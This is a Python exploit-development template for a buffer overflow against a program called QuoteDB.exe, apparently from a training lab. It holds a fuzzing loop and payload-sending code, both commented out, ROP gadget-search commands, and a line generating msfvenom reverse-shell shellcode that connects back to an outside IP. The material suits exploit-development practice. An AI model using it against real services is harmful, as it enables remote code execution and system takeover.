import socket, time, sys, struct
from struct import pack
from ExploitFramework import *

"""
.load narly; !nmod
struct.pack("<I", (EIP))
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -s 'pop ecx'
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -s 'mov esi' -c 10
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -r -a
getMsfVenomShellcode('172.18.132.127', '443', badchars=bc.getBadChars())
msf-nasm_shell
"""

##############################################
# PARAMS
##############################################
ip = "127.0.0.1"
port = 1337
buf = b""
timeout = 1
offset = 0
fuzz_limit = 50000
fuzz_step = 100
bc = BadChars(b"\x00\x0a\x0d")
fuzz_pattern = b"AABCDCACD"
# s -a 0 L?80000000 "AABCDCACD"
##############################################


##############################################
# FUZZ
##############################################

# while len(buf) < fuzz_limit:
#     buf += b"A" * fuzz_step
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.settimeout(timeout)
#     connect = s.connect((ip, port))
#     # print(s.recv(1024))
#     print(f"Count: {len(buf)}")
#     s.send(buf)
#     # print(s.recv(1024))
#     s.close()

##############################################
# SEND EXPLOIT
##############################################
# checkForBadChars(buf, bc.getBadChars())
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.settimeout(timeout)
# connect = s.connect((ip, port))
# # print(s.recv(1024))
# s.send(buf)
# print(f"{GOOD} {len(buf)} bytes sent")
# # print(s.recv(1024))
# s.close()